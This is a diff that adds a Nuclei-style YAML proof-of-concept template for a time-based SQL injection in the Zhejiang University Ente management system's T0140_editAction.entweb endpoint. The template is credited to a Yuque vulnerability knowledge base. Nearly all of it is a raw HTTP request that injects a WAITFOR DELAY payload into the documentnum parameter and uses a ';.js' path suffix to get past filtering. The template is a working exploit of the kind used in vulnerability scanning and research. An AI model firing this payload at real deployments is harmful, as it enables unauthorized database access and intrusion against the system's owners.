@@ -1,0 +1,52 @@
+id: poc-xw9prkk6zpqz86ei
+info:
+  name: 浙大恩特管理系统 T0140_editAction.entweb SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xw9prkk6zpqz86ei'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xw9prkk6zpqz86ei
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1'';WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Connection: close
+
+
+    Cookie: JSESSIONID=1DAEEF5E703FF40871BD44A67C1EEDD5; JSESSIONID=2C6DAAA80F315B114CD65C9DA80D8D8C
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    0
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
